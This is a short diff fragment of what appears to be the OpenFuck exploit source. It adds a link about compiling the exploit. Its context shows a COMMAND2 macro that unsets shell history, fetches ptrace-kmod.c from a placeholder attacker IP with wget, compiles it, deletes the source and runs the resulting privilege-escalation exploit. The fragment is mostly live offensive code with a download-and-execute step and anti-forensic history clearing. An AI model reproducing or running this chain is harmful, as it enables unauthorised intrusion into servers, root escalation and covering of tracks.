@@ -11,4 +11,6 @@ change the url only to execute the code
 
 #define COMMAND2 "unset HISTFILE; cd /tmp;export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin; wget http://enter ur ip here/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c; rm ptrace-kmod.c; ./exploit; \n"
 
+for more refer:https://medium.com/@snowshoe/how-to-compile-openfuckv2-c-69e457b4a1d1
+
 
